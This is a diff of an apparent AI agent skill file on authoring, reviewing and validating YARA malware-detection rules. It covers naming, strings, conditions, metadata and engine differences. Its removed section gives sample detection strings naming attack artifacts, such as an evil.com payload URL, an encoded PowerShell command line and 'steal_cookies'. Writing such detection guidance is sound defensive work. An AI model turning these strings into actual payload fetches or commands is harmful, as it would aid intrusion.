@@ -1,241 +1,303 @@
 ---
-name: yara-skill
-description: Expert YARA rule authoring, review, and optimization. Use when writing new YARA rules, reviewing existing rules for quality issues, optimizing rule performance, or converting detection logic to YARA syntax. Covers rule naming conventions, string selection, condition optimization, performance tuning, and automated quality checks based on yaraQA.
+name: yara-rule-skill
+description: Writes, reviews, and optimizes YARA rules using the YARA Style Guide, the YARA Performance Guidelines, yaraQA checks, and YARA-Forge quality criteria. Use when the user wants a new YARA rule, a review or quality assessment of an existing rule or rule set, help with a slow, noisy, or non-compiling rule, an explanation of a yaraQA issue ID, or rules that should pass YARA-Forge QA.
 ---
 
-# YARA Rule Authoring & Review
+# YARA Rule Authoring and Review
 
-Expert guidance for writing high-quality, performant YARA rules based on industry best practices and automated QA checks.
+Version 2.0. This skill turns four sources into working practice:
 
-> **Version:** 1.3 — Added string diversity guidance (mix categories, not quantity)
-
-> **Scope:** This skill covers readability, maintainability, and usability. For performance optimization (atoms, short-circuit evaluation), see the Performance Reference.
-
----
-
-## Quick Start Template
-
-```yara
-rule MAL_Family_Platform_Type_Date {
-    meta:
-        description = "Detects ..."
-        author = "Your Name"
-        date = "2026-02-03"
-        reference = "https://..."
-        score = 75
-    strings:
-        $x1 = "unique malware string"
-        $s1 = "grouped string 1"
-        $s2 = "grouped string 2"
-        $a1 = "Go build"
-        $fp1 = "Copyright Microsoft"
-    condition:
-        uint16(0) == 0x5a4d
-        and filesize < 10MB
-        and $a1
-        and (
-            1 of ($x*)
-            or all of ($s*)
-        )
-        and not 1 of ($fp*)
-}
-```
-
----
-
-## Rule Naming Convention
-
-Format: `CATEGORY_SUBCATEGORY_DESCRIPTOR_DATE`
-
-The rule name is often the first information shown to users. It should include:
-- Type of threat
-- Classification tags  
-- Descriptive identifier
-- Context/period of creation
-
-Values are ordered from **generic to specific**, separated by underscores (`_`).
-
-### Main Categories (Required)
-
-| Prefix | Meaning | Example |
+| Source | Governs | Details |
 |--------|---------|---------|
-|`MAL`|Malware|`MAL_APT_CozyBear_ELF_Apr18`|
-|`HKTL`|Hack tool|`HKTL_PS1_CobaltStrike_Oct23`|
-|`WEBSHELL`|Web shell|`WEBSHELL_APT_ASP_China_2023`|
-|`EXPL`|Exploit code|`EXPL_CVE_2023_1234_WinDrv`|
-|`VULN`|Vulnerable component|`VULN_Driver_Apr18`|
-|`SUSP`|Suspicious/generic|`SUSP_Anomaly_LNK_Huge_May23`|
-|`PUA`|Potentially unwanted app|`PUA_Adware_Win_Trojan`|
+| [YARA Style Guide](https://github.com/Neo23x0/YARA-Style-Guide) | Rule names, metadata, string groups, condition layout | [references/style.md](references/style.md) |
+| [YARA Performance Guidelines](https://github.com/Neo23x0/YARA-Performance-Guidelines) (rev. 1.6) | Atoms, regex, condition order, modules | [references/performance.md](references/performance.md) |
+| [yaraQA](https://github.com/Neo23x0/yaraQA) | Automated checks with IDs (`PA2`, `SM4`, `CE1`, ...) | [references/yaraqa-checks.md](references/yaraqa-checks.md) |
+| [YARA-Forge](https://github.com/YARAHQ/yara-forge) | Compile gates, quality score, package tiers | [references/yara-forge.md](references/yara-forge.md) |
 
-### Secondary Classifiers (Combine as needed)
+Guideline items that no tool checks have their own IDs in [references/issue-identifiers.md](references/issue-identifiers.md).
 
-**Intention/Background:**
-- `APT` — Nation state actor
-- `CRIME` — Criminal activity  
-- `ANOMALY` — Generic suspicious characteristics
-- `RANSOM` — Ransomware
+## How YARA spends its time
 
-**Malware Types:**
-- `RAT`, `Implant`, `Stealer`, `Loader`, `Crypter`, `PEEXE`, `DRV`
+Most guidance below follows from the scan model:
 
-**Platform:**
-- `WIN` (default, often omitted), `LNX`, `MacOS`
-- `X64` (default), `X86`, `ARM`, `SPARC`
+1. **Compile:** YARA extracts **atoms** (substrings of up to 4 bytes) from every string.
+2. **Search:** one Aho-Corasick pass looks for all atoms of all rules.
+3. **Verify:** each atom hit is expanded to a full string match. Regex runs only here.
+4. **Condition:** evaluated left to right, stopping at the first decisive result.
 
-**Technology:**
-- `PE`/`ELF`, `PS`/`PS1`/`VBS`/`BAT`/`JS`
-- `.NET`/`GO`/`Rust`, `PHP`/`JSP`/`ASP`
-- `MalDoc`, `LNK`, `ZIP`/`RAR`
+What follows from it:
 
-**Modifiers:**
-- `OBFUSC` — Obfuscated
-- `Encoded` — Encoded payload
-- `Unpacked` — Unpacked payload
-- `InMemory` — Memory-only detection
+- String choice is the main cost. A condition cannot stop a string from being searched: `filesize < 200 and $slow_regex` is still slow on every file.
+- A string without a good atom (shorter than 4 bytes, uniform like `00 00 00 00`, or a regex with no fixed 4-byte run) slows the **whole rule set**, not just its own rule.
+- Short-circuit evaluation helps only with condition work. Put cheap checks (`uint16(0)`, `filesize`) before expensive ones (`math.*`, hashes, loops, module fields).
 
-**Packers/Installers:**
-- `SFX`, `UPX`, `Themida`, `NSIS`
+## Workflow: write a new rule
 
-**Uniqueness Suffixes:**
-- MonthYear: `May23`, `Jan19`, `Apr18`
-- Number: `*_1`, `*_2`
-
-### Naming Examples
+Copy this checklist into your working notes and complete it in order:
 
 ```
-APT_MAL_CozyBear_ELF_Loader_Apr18
-    └── APT malware loader by CozyBear for Linux (April 2018)
-
-SUSP_Anomaly_LNK_Huge_Apr22
-    └── Suspicious anomaly: oversized link file (April 2022)
-
-MAL_CRIME_RANSOM_PS1_OBFUSC_Loader_May23
-    └── Crime ransomware: obfuscated PowerShell loader (May 2023)
+- [ ] 1. Scope: target samples, file type, disk or memory, specific family or generic trait
+- [ ] 2. Category and rule name
+- [ ] 3. Strings: 3-7 diverse strings grouped as $x / $s / $a / $fp
+- [ ] 4. Condition: header -> filesize -> other limits -> strings -> FP filters -> expensive checks
+- [ ] 5. Metadata: description, author, reference, date, hash, score
+- [ ] 6. Validate with scripts/validate_rule.py; fix and repeat until clean
+- [ ] 7. Self-review against "Quick checks" below
 ```
 
----
+**Never invent evidence.** Strings, hashes, and references must come from the user's samples or sources. If the user gave no sample data, ask for it or deliver a clearly marked template with placeholders. Don't present a placeholder as a working detection.
 
-## Rule Structure & Formatting
+### 1. Scope
 
-### Indentation
+Ask (or infer from the request) what the rule must match and what it must never match. A rule for one malware family, a rule for a hack tool, and a heuristic for a suspicious trait need different strings, conditions, and scores.
 
-Use **3-4 spaces** consistently. Never mix tabs and spaces.
+### 2. Name
 
-**DON'T:**
+Format: `CATEGORY_[CLASSIFIERS_]Descriptor_Suffix`, ordered from generic to specific, joined with `_`.
+
+| Main category | Use for |
+|---------------|---------|
+| `MAL` | Malware |
+| `HKTL` | Hack tools (including dual-use offensive tooling) |
+| `WEBSHELL` | Web shells |
+| `EXPL` | Exploit code, PoCs, exploit payloads |
+| `VULN` | Vulnerable components (drivers, libraries) |
+| `SUSP` | Anomalies and suspicious traits (obfuscation, odd import sets, shellcode) |
+| `PUA` | Potentially unwanted applications |
+
+Add classifiers as needed (`APT`, `CRIME`, `RANSOM`, `LNX`, `MacOS`, `ELF`, `PS1`, `NET`, `GO`, `OBFUSC`, `InMemory`, ...) and end with a uniqueness suffix: month and year (`May23`) and, if needed, a number (`_1`). Examples: `MAL_APT_CozyBear_ELF_Loader_Apr18`, `SUSP_Anomaly_LNK_Huge_Apr22`, `HKTL_Go_EasyHack_Oct23`. Full vocabulary: [references/style.md](references/style.md#rule-names).
+
+Rule names are identifiers: letters, digits, and `_` only, no leading digit, at most 128 characters. Write `NET`, not `.NET`.
+
+### 3. Strings
+
+Group strings by role. The prefixes make the condition read like the intent:
+
+| Prefix | Role | Typical use in condition |
+|--------|------|--------------------------|
+| `$x*` | Highly specific; one hit is enough | `1 of ($x*)` |
+| `$s*` | Weak alone, meaningful together | `all of ($s*)`, `3 of ($s*)` |
+| `$a*` | Pre-selection; narrows file type or format | `$a1 and ...` |
+| `$fp*` | Known benign content; vetoes a match | `not 1 of ($fp*)` |
+
+Selection rules:
+
+- **Prefer 3-7 strings.** More than about 10 usually means redundant or weak strings. yaraQA flags more than 20 (`HS1`) and more than 40 (`HS2`), not counting `$fp*` filters.
+- **Diversify.** Take strings from different categories (usage text, error messages, PDB or build paths, mutex or pipe names, C2 URL patterns, unique function or class names, typos, opcodes). Eight log lines with the same `[DEBUG]` prefix all break when the author changes that prefix.
+- **Avoid shared code.** Library, runtime, and framework strings (OpenSSL, zlib, Go runtime, MSVC CRT, common Windows API names) match goodware. They can be `$a*` or `$s*`, never `$x*`.
+- **Give every string a good atom:** at least 4 bytes, not uniform, not a common byte run. Extend short strings with neighboring bytes (a space, quote, `\x00`).
+- **Use regex only when a string or hex pattern can't express it.** Then include a fixed run of 4+ bytes and bound every quantifier (`.{1,64}`, not `.*`).
+- **Readable values.** Write text as text, not hex (`SV2`). For hex that encodes text, add a comment with the readable form; wrap long hex every 16 bytes.
+- **Concise identifiers:** `$x1`, `$s2`, `$eval`, not `$string_value_footer_1`.
+
+Modifiers (default is `ascii`; add others only when the samples need them):
+
+| Modifier | Effect | Guidance |
+|----------|--------|----------|
+| `wide` | Searches the UTF-16LE form | Use for strings stored as UTF-16 (.NET user strings, resources). `ascii wide` searches both. |
+| `nocase` | Searches every case variant of the atom (up to 16 for 4 letters) | Only for case-insensitive content (PHP, batch, PowerShell keywords). Prefer `/[Pp]assword/`, or include a digit, space, or symbol in the string (`NC1`). |
+| `fullword` | Requires non-alphanumeric characters (or file boundaries) on both sides | Don't use on strings starting or ending with `\`, `/`, `.`, `_`, `-`, `(`, `)`: the match fails or misbehaves (`SM2`-`SM5`). |
+| `xor`, `xor(a-b)` | One search pattern per key; 256 keys (`0x00`-`0xff`) by default | Narrow the key range when known. Can't combine with `nocase`. |
+| `base64`, `base64wide` | Searches base64-encoded forms of the string | YARA-X needs at least 3 bytes of plaintext; longer plaintext yields better atoms. Can't combine with `nocase`, `xor`, or `fullword`. |
+
+PDB paths are always ASCII: never use `wide` on a `.pdb` string (`SM1`, `SM6`).
+
+### 4. Condition
+
+Order the parts as the Style Guide prescribes. The same order makes the most of short-circuit evaluation:
+
 ```yara
-rule BAD_EXAMPLE {
-meta:
-description = "no indentation"
-strings:
-$s1 = "value"
-}
+condition:
+   uint16(0) == 0x5a4d          // 1. header (file type)
+   and filesize < 2MB           // 2. size limit
+   and pe.number_of_signatures == 0  // 3. other limitations
+   and (                        // 4. string combinations
+      1 of ($x*)
+      or all of ($s*)
+   )
+   and not 1 of ($fp*)          // 5. false positive filters
 ```
 
-**DO:**
+Expensive work (`math.entropy`, `hash.*`, loops over sections or matches) goes last.
+
+Layout: start each `and` on a new line; put `or` groups in an indented, parenthesized block. In YARA, `and` binds tighter than `or`, so `A and B or C` means `(A and B) or C`. A trailing top-level `or 4 of them` is a deliberate pattern: it matches when many strings are present, regardless of file type or size (unpacked code in memory, embedded payloads). Use it on purpose, never by accident.
+
+Header checks (little-endian `uint` reads; verified byte orders):
+
+| Format | Check |
+|--------|-------|
+| PE (`MZ`) | `uint16(0) == 0x5a4d` |
+| ELF | `uint32(0) == 0x464c457f` |
+| Mach-O 64-bit / 32-bit (little-endian) | `uint32(0) == 0xfeedfacf` / `uint32(0) == 0xfeedface` |
+| ZIP, OOXML, JAR, APK (`PK\x03\x04`) | `uint32(0) == 0x04034b50` |
+| OLE2 / CFB (legacy Office, MSI) | `uint32(0) == 0xe011cfd0` |
+| LNK | `uint32(0) == 0x0000004c` |
+| RTF (`{\rt`) | `uint32(0) == 0x74725c7b` |
+| GIF (`GIF89a` / `GIF87a`) | `uint32be(0) == 0x47494638 and (uint16be(4) == 0x3961 or uint16be(4) == 0x3761)` |
+
+Scripts and text formats have no magic bytes. Use an `$a*` pre-selection string (`"<?php"`, `"<%@"`) and a tight `filesize` limit instead.
+
+Don't replace these checks with modules: `pe.is_pe` parses the whole file, and the `magic` module doesn't exist in YARA-X.
+
+### 5. Metadata
+
+Mandatory: `description` (starts with "Detects ...", 60-400 characters, no URLs), `author` (full name or handle; one field, comma-separated for several authors), `reference` (stable public URL, report name, or "Internal Research"), `date` (creation date, `YYYY-MM-DD`; changes go into `modified`).
+
+Recommended: `hash` (SHA256 of the file the rule targets, not of an archive containing it; repeat the field for several samples) and `score`:
+
+| Score | Meaning | Examples |
+|-------|---------|----------|
+| 0-39 | Very low | Capabilities, common packers (useful in combination) |
+| 40-59 | Noteworthy | Uncommon packers, PE header anomalies |
+| 60-79 | Suspicious | Heuristics, obfuscation, generic detections |
+| 80-100 | High | Direct malware or hack tool matches |
+
+Optional: `modified`, `old_rule_name`, `tags` (comma-separated, for classifiers that don't fit the name), `license`.
+
+Always set `score` explicitly. Without it, YARA-Forge infers one from keywords anywhere in the metadata (see [references/yara-forge.md](references/yara-forge.md#score)).
+
+### 6. Validate
+
+Run the validator on every rule before showing it to the user (see [Validation](#validation)).
+
+### 7. Quick checks
+
+Before returning a rule, confirm:
+
+- [ ] Compiles in YARA and YARA-X without errors **and without warnings**
+- [ ] Every string is referenced; no `N of them` with N above the string count (`CE1`)
+- [ ] No string shorter than 4 bytes (`PA2`); no `$s at 0` for a 1-2 byte header (`PA1`); no regex without a 4-byte anchor (`RE1`)
+- [ ] File type check and `filesize` limit present when the target type is known
+- [ ] Expensive checks last; no `math.*` or hash over the whole file early in the condition (`CF1`, `CF2`)
+- [ ] `fullword` not on path-like strings (`SM2`-`SM5`); no `wide` on PDB strings (`SM1`, `SM6`)
+- [ ] No generic or library string can fire the rule alone
+- [ ] Name has a main category and suffix; all mandatory metadata present; `score` fits the category
+
+## Workflow: review an existing rule
+
+1. Validate it first. A compile failure or an always-false condition outranks every style issue.
+2. Walk through it in this order: compile result → logic (can it match? can it misfire?) → false-positive risk → performance → metadata → naming and layout.
+3. Tag each finding with an ID: yaraQA IDs from [references/yaraqa-checks.md](references/yaraqa-checks.md); YARA-Forge compile IDs `SI1`/`SI2`; manual-review IDs from [references/issue-identifiers.md](references/issue-identifiers.md). Don't invent IDs.
+4. Write the output in the format below.
+
+### Review output format
+
+Produce three parts:
+
+1. **Verdict:** one or two sentences, e.g. "Works, but slow on large files (unanchored regex) and missing metadata."
+2. **Findings table**, most severe first. Severity follows yaraQA and YARA-Forge levels: `critical` (doesn't compile), `error` (never matches, or major performance or logic flaw), `warning` (FP risk or performance impact), `info` (style).
+
+   | ID | Severity | Finding | Fix |
+   |----|----------|---------|-----|
+   | `RE1` | warning | `$r1` has no fixed 4-byte run | Add a literal prefix, e.g. `/mshta\.exe http:\/\/.../` |
+
+3. **Assessed rule:** the author's rule with minimal fixes and inline comments, not a rewrite. This teaches the author and keeps their decisions visible.
+   - Fix only clear-cut problems: compile errors, `PA1`-style header checks, metadata typos (`link` → `reference`), missing mandatory fields you can fill from the rule itself, and an obviously missing header check or generous `filesize` limit when the target file type is evident. Anything that changes what the rule matches beyond that stays a comment.
+   - Don't fill gaps with guesses: no invented dates, references, or hashes. Mark them as missing in a comment.
+   - Renaming to the naming convention is fine; record the previous name in `old_rule_name`.
+   - Keep the author's string identifiers (`$ama_*` stays `$ama_*`); suggest regrouping in comments.
+   - Put every suggestion in a `//` or `/* */` comment.
+   - **The assessed rule must compile.** Never reference strings that don't exist (`all of ($op*)` with no `$op*` strings), never add placeholder hex. A suggestion that needs new strings goes in a comment.
+
+Offer a full rewrite only when the user asks for one or the rule can't be repaired in place; follow the authoring workflow for it.
+
+Example assessed rule:
+
 ```yara
-rule GOOD_EXAMPLE {
+rule MAL_Amaranth_Loader_Aug23 {   // naming: added category (MAL_) and suffix from the rule date
    meta:
-      description = "proper 3-space indent"
-      author = "Name"
+      description = "Detects Amaranth Loader based on code patterns of its payload decryption routine"   // was: "Amaranth Loader"
+      author = "@Tera0017/@_CPResearch_"
+      reference = "https://research.checkpoint.com/"   // was: link
+      date = "2023-08-15"
+      old_rule_name = "Amaranth_Loader"                // added: keeps the previous name searchable
+      score = 80                                       // added: direct malware match
    strings:
-      $s1 = "value"
+      // Consider grouping: $ama_iv and $ama_decr look unique enough for $x*,
+      // $ama_size is weaker and fits a $s* group
+      $ama_size = {41 BD 01 00 00 00 41 BC 00 40 06 00 E9 92 00 00 00}
+      $ama_iv = {C7 84 24 30 02 00 00 12 34 56 78}
+      $ama_decr = {FF C1 48 D3 E8 41 30 00 FF C2 49 FF C0}
+      // removed: $mz = "MZ" (PA1/PA2, replaced by uint16 check below)
    condition:
-      uint16(0) == 0x5a4d
-      and filesize < 300KB
+      uint16(0) == 0x5a4d          // was: $mz at 0 (PA1)
+      and filesize < 10MB          // added: size limit
+      and any of ($ama*)
+      // Consider: (1 of ($ama_iv, $ama_decr) or 2 of them) to require
+      // either a unique pattern or two weaker ones
 }
 ```
 
-### Rule Tags
+## Workflow: diagnose a slow rule or "too many matches"
 
-Put **main categories in the rule name**. Additional tags go in a `tags` meta field:
+Conditions don't fix either problem; strings do. Check in this order:
 
-```yara
-rule MAL_APT_CozyBear_Win_Trojan_Apr18 {
-    meta:
-        tags = "APT28, Gazer, phishing"
-    ...
-}
+1. Regex quantifiers `.*`, `.+`, `.*?`, and unbounded `{n,}`; give each an upper bound.
+2. Very large ranges (`{1,300000}`) and big jumps in hex strings.
+3. Hex wildcards that can be narrowed, or a string that can be split at the wildcard.
+4. Alternations (`/(a|b)cde/`, `{ C7 C3 00 (31 | 33) }`): split into separate strings.
+5. Short strings (< 4 bytes) and uniform content (`AAAA...`, `00 20 00 20 ...`).
+6. `nocase` on long letter-only strings; `xor` or `base64` without need.
+7. Loops bounded by `filesize` or by a match count (`#a`) of a common string; add a `filesize` limit before them.
+8. Modules used only for a file type check.
+
+Details and examples: [references/performance.md](references/performance.md).
+
+## Validation
+
+**Every rule you write or modify must pass validation before you return it.** Don't rely on reading the rule.
+
+```bash
+python scripts/validate_rule.py rule.yar          # from a file
+python scripts/validate_rule.py --stdin < rule.yar
+python scripts/validate_rule.py rule.yar --strict # treat warnings as failures
+python scripts/validate_rule.py rule.yar --json
 ```
 
----
+The script compiles with YARA-X and, if `yara-python` is installed, with YARA 4.x too. It reports errors and warnings from both. Run `pip install -r scripts/requirements.txt` first if the import fails.
 
-## Meta Data Fields
+Loop: validate → fix → validate again until it passes. Then:
 
-### Mandatory Fields
+- **Warnings matter.** YARA-Forge compiles with warnings as errors and penalizes a warning with -70 quality (`SI2`), which keeps the rule out of the core and extended packages. Fix warnings unless the user explicitly accepts them.
+- If the validator can't run (no Python, no network to install packages), say so plainly and list what you checked by hand. Never claim a rule compiles without having compiled it.
+- If the user has [yaraQA](https://github.com/Neo23x0/yaraQA) available, suggest `python3 yaraQA.py -f rule.yar` for the automated quality checks.
 
-| Field | Format | Guidelines |
-|-------|--------|------------|
-|`description`|String|60-400 chars, start with "Detects ...", no URLs|
-|`author`|String|Full name or Twitter handle; comma-separated for multiple|
-|`reference`|String|URL or "Internal Research"; avoid unstable/private links|
-|`date`|YYYY-MM-DD|Creation date only (use `modified` for updates)|
+Engine differences that cause "compiles here, fails there" (verified with YARA 4.5.4 and YARA-X 1.23):
 
-### Optional Fields
+| Construct | YARA 4.x | YARA-X |
+|-----------|----------|--------|
+| Unreferenced string (`$b` unused) | Error | Error. Prefix `$_` to keep an unused string in both. |
+| Literal `{` in regex (`/abc{/`) | Accepted | Error; escape it: `/abc\{/` |
+| `base64` on a string under 3 bytes | Accepted | Error |
+| `import "magic"` | Only in builds with libmagic (never on Windows) | Error (no such module) |
+| `.*`, `.+`, `.*?`, `.{n,}` in regex | Warning (only after `.`; `[a-z]{2,}` passes) | Accepted silently |
+| Same string value twice | Accepted | Warning (`duplicate_pattern_value`) |
+| `uint16(0) == 0x5a4d5a` (value can't fit) | Accepted | Warning (`unsatisfiable_expr`) |
+| `for ... in (1..filesize)` | Accepted | Warning (`potentially_slow_loop`) |
+| `N of them` with N above string count | Warning | Warning (`invariant_expr`) |
 
-| Field | Format | Purpose |
-|-------|--------|---------|
-|`score`|0-100|Severity × specificity for prioritization|
-|`hash`|String(s)|SHA256 preferred; can use multiple times|
-|`modified`|YYYY-MM-DD|Last update date|
-|`old_rule_name`|String|Previous name for searchability|
-|`tags`|Comma-separated|Extra classification tags|
-|`license`|String|License identifier|
+Both engines reject invalid escapes in text strings (`"C:\Windows"` must be `"C:\\Windows"`), duplicate modifiers, `xor nocase`, and references to undefined string sets.
 
-### Score Guidelines
-
-| Score | Significance | Examples |
-|-------|--------------|----------|
-|0-39|Very Low|Capabilities, common packers|
-|40-59|Noteworthy|Uncommon packers, PE anomalies|
-|60-79|Suspicious|Heuristics, obfuscation, generic rules|
-|80-100|High|Direct malware/hack tool matches|
-
----
-
-## String Categories ($x, $s, $a, $fp)
-
-Organize strings using the **Triad Approach** plus false positive filters:
-
-| Prefix | Meaning | Usage |
-|--------|---------|-------|
-|`$x*`|Highly specific|Unique to threat; `1 of ($x*)` triggers|
-|`$s*`|Grouped strings|Need multiple; `all of ($s*)` or `3 of ($s*)`|
-|`$a*`|Pre-selection|Narrows file type; use early in condition|
-|`$fp*`|False positive filters|Exclude benign; `not 1 of ($fp*)`|
-
-### String Count Guidelines
-
-**Maximum 10 strings total** (including opcodes). Optimal: **3-7 strings**.
-
-Too many strings:
-- Increases memory usage during scanning
-- Slows down rule matching
-- Often indicates redundant/weak strings
-- Makes rules harder to maintain
-
-**When reviewing rules:**
-- Select the **highest-scoring/most unique** strings
-- Remove strings with high goodware counts
-- Eliminate similar strings (e.g., debug messages with same prefix)
-- 1-2 opcodes maximum (if included)
-
-### Example
+## Rule template
 
 ```yara
 rule HKTL_Go_EasyHack_Oct23 {
    meta:
-      description = "Detects a Go based hack tool"
+      description = "Detects EasyHack, a Go based hack tool that injects payloads into remote processes"
       author = "John Galt"
-      date = "2023-10-23"
       reference = "https://example.com/EasyHack"
+      date = "2023-10-23"
+      hash = "0000000000000000000000000000000000000000000000000000000000000000"  // placeholder: SHA256 of the sample
+      score = 80
    strings:
-      $a1 = "Go build"              // Pre-selection: Go binary
+      $a1 = "Go build ID: \""                     // pre-selection: Go binary
 
       $x1 = "Usage: easyhack.exe -t [IP] -p [PORT]"
       $x2 = "c0d3d by @EdgyHackerFreak"
 
-      $s1 = "main.inject"
-      $s2 = "main.loadPayload"
+      $s1 = "main.injectPayload"
+      $s2 = "main.loadShellcode"
+      $s3 = "easyhack/internal/"
 
       $fp1 = "Copyright by CrappySoft" wide
    condition:
@@ -243,436 +305,21 @@ rule HKTL_Go_EasyHack_Oct23 {
       and filesize < 20MB
       and $a1
       and (
-        1 of ($x*)
-        or all of ($s*)
+         1 of ($x*)
+         or all of ($s*)
       )
       and not 1 of ($fp*)
 }
 ```
 
-### String Diversity — Mix Categories, Not Quantity
-
-**Avoid over-reliance on similar strings.** If the author changes a pattern (e.g., `[DEBUG]` → `[DBG]`), all strings of that type become obsolete at once.
-
-**DO:** Select 1-4 strings from **different categories** for resilience:
-
-| Category | Examples |
-|----------|----------|
-| Format strings | `"[DEBUG] %s: %d"`, `"%s:%d/%s"` |
-| File paths | `"C:\\Users\\Public\\file.exe"`, `"/tmp/.hidden/data"` |
-| Usage/help | `"Usage: malware.exe <host> <port>"` |
-| Error messages | `"[ERROR] Connection failed"` |
-| IP addresses | `"192.168.1.100"`, `"10.0.0.1"` |
-| Domains | `"evil.com"`, `"cdn.badactor.net"` |
-| Build artifacts | `"hackme.pdb"`, `"/src/main.c"` |
-| URLs | `"https://evil.com/payload.exe"` |
-| Command lines | `"cmd.exe /c powershell -enc"` |
-| Function names | `"inject_payload"`, `"steal_cookies"` |
-| Variable names | `"g_hMutex"`, `"s_config"` |
-| Special imports | `"WinExec"`, `"InternetOpenA"` |
-
-**DON'T — Too many similar strings (fragile):**
-```yara
-// AVOID: 8 debug strings with same prefix
-$s1 = "[DEBUG] WinHTTP session opened" fullword ascii
-$s2 = "[DEBUG] Download URL: %s" fullword ascii
-$s3 = "[DEBUG] Adding HTTP headers..." fullword ascii
-$s4 = "[DEBUG] Download complete!" fullword ascii
-$s5 = "[DEBUG] Starting PE execution" fullword ascii
-$s6 = "[DEBUG] PE execution completed" fullword ascii
-$s7 = "[DEBUG] Waiting %d seconds..." fullword ascii
-// If author changes [DEBUG] to [DBG], ALL break
-```
-
-**DO — Diverse categories (resilient):**
-```yara
-// GOOD: Mix of categories
-$x1 = "[ERROR] Usage: stager_evade.exe <url>"  // Usage help
-$s1 = "stager_debug.log"                       // File path
-$s2 = "https://%s:%d/%s"                       // URL format
-$s3 = { 68 74 74 70 73 3A 2F 2F }             // "https://" hex
-$op1 = { C3 0F 1F 40 00 66 66 2E 0F }         // OpCodes
-```
-
-### String Identifier Best Practices
-
-**Opt for readable values:**
-```yara
-// AVOID:
-$s1 = { 46 72 6F 6D 42 61 73 65 36 34 }
-
-// USE:
-$s1 = "FromBase64"
-```
-
-**Choose concise identifiers:**
-```yara
-// AVOID:
-$string_value_footer_1 = "eval("
-$selection_14 = "eval("
-
-// USE:
-$s1 = "eval("
-$eval = "eval("
-```
-
-### Hex String Formatting
-
-Add ASCII comments for readability. Wrap at 16-byte intervals.
-
-```yara
-/* )));
-IEX( */
-$s1 = { 29 29 29 3b 0a 49 45 58 28 0a }
-
-// Long hex wrapped at 16 bytes:
-$s1 = { 2c 20 2a 79 6f 77 2e 69 20 26 20 30 78 46 46 29 
-        3b 0a 20 20 70 72 69 6e 74 66 20 28 28 28 2a 79 }
-```
-
----
-
-## Condition Formatting
-
-### Structure Template
-
-```yara
-condition:
-    header_check
-    and file_size_limitation
-    and other_limitations
-    and string_combinations
-    and false_positive_filters
-```
-
-### Formatting Rules
-
-- **New line before `and`**
-- **Indent blocks for `or` groups**
-- **Group related conditions with parentheses**
-
-**Example:**
-```yara
-condition:
-    uint16(0) == 0x5a4d
-    and filesize < 300KB
-    and pe.number_of_signatures == 0
-    and (
-        1 of ($x*)
-        or (
-            2 of ($s*)
-            and 3 of them
-        )
-    )
-    and not 1 of ($fp*)
-```
-
-**Multi-value conditions:**
-```yara
-condition:
-    (
-        uint16(0) == 0x5a4d     // MZ marker
-        or uint16(0) == 0x457f  // ELF marker
-    )
-    and filesize < 300KB
-    and all of ($s*)
-```
-
----
-
-## Performance Critical Rules
-
-### String Length
-- Minimum effective atom: **4 bytes**
-- Avoid: `"MZ"`, `{ 4D 5A }`, repeating chars (`AAAAAA`)
-- Use `uint16(0) == 0x5A4D` for short header checks
-
-### Regex
-- Always include **4+ byte anchor**
-- Avoid: `.*`, `.+`, unbounded quantifiers `{x,}`
-- Prefer: `.{1,30}` with upper bound
-
-### Condition Order
-```yara
-// GOOD: Cheap first, expensive last
-uint16(0) == 0x5A4D
-and filesize < 100KB
-and all of them
-and math.entropy(500, filesize-500) > 7
-
-// BAD: Expensive first
-math.entropy(...) > 7 and uint16(0) == 0x5A4D
-```
-
-### Module Alternatives
-```yara
-// AVOID: Parses entire file
-import "pe"
-condition: pe.is_pe
-
-// USE: Header check only
-condition: uint16(0) == 0x5A4D
-```
-
-See [references/performance.md](references/performance.md) for detailed optimization.
-
----
-
-## Common Issues (yaraQA)
-
-### Logic Errors
-
-| ID | Issue | Problem | Fix |
-|----|-------|---------|-----|
-|`CE1`|Never matches|`2 of them` with only 1 string|Adjust count|
-|`SM2`|PDB + fullword|PDBs start with `\`, `fullword` breaks match|Remove `fullword`|
-|`SM3`|Path + fullword|`\Section\` won't match with `fullword`|Remove `fullword`|
-|`SM5`|Problematic chars|`fullword` with `.` `)` `_` etc.|Remove `fullword`|
-|`CS1`|Substring string|One string is substring of another|Remove redundant string|
-|`DS1`|Duplicate strings|Same value defined twice|Consolidate|
-
-### Performance Warnings
-
-| ID | Issue | Problem | Fix |
-|----|-------|---------|-----|
-|`PA1`|Short at position|`$mz at 0`|Use `uint16(0) == 0x5A4D`|
-|`PA2`|Short atom|< 4 bytes|Extend with context bytes|
-|`RE1`|Unanchored regex|No 4+ byte fixed prefix|Add anchor|
-|`CF1`|Expensive calc|Hash/math over full file|Move to end of condition|
-|`NC1`|`nocase` letters only|Generates many atoms|Add special char or use regex|
-
-See [references/yaraqa-checks.md](references/yaraqa-checks.md) for complete reference.
-
----
-
-## Modifiers Reference
-
-| Modifier | Atom Count | Best Practice |
-|----------|------------|---------------|
-|`ascii`|1|Default if no modifier specified|
-|`wide`|1|UTF-16, use when needed|
-|`ascii wide`|2|Both encodings|
-|`nocase`|Up to 16|Avoid on short strings; use regex `[Pp]attern` instead|
-|`fullword`|Word boundary|Avoid with paths starting `\` or ending `\`|
-|`xor`|256 variations|Use sparingly; consider single byte xor instead|
-
----
-
-## Tweaks
-
-### String Matching vs. Hashing
-
-Avoid hashing loops — use direct string matching:
-
-```yara
-// LESS EFFICIENT:
-for any var_sect in pe.sections:
-   (hash.md5(var_sect.raw_data_offset, 0x100) == "d99eb1e503...")
-
-// MORE EFFICIENT:
-strings:
-   $section_hash = { d9 9e b1 e5 03 ca c3 a1 ... }
-condition:
-   $section_hash
-```
-
----
-
-## Rule Review Output Format
-
-When reviewing an existing rule, produce an **Assessed Rule** with inline comments rather than a fully rewritten version. This educates the author while preserving their original decisions.
-
-### Critical Requirements
-
-**1. MUST COMPILE — Non-negotiable**
-- Every rule you output must compile successfully with `yara -p rule.yar`
-- Never include references to undefined string identifiers (e.g., `all of ($op*)` when no `$op*` strings exist)
-- Never break YARA syntax (unclosed braces, invalid modifiers, malformed hex)
-- If a suggestion would require adding strings that don't exist, put it in a comment instead
-
-**2. Suggestions go in comments only**
-- All recommendations, improvement ideas, and "consider adding..." notes must be in `//` or `/* */` comments
-- Do not modify the condition to use string groups that aren't defined
-- Do not add placeholder references that would cause compilation failures
-
-### Principles
-
-1. **Fix only obvious issues** — PA1, meta typos, missing mandatory fields
-2. **Preserve original identifiers** — Keep `$ama_*`, don't rename to `$x1`, `$s1`
-3. **Add educational comments** — Explain the triad approach without enforcing it
-4. **Suggest, don't prescribe** — Let the author decide on string grouping
-
-### Comment Style
-
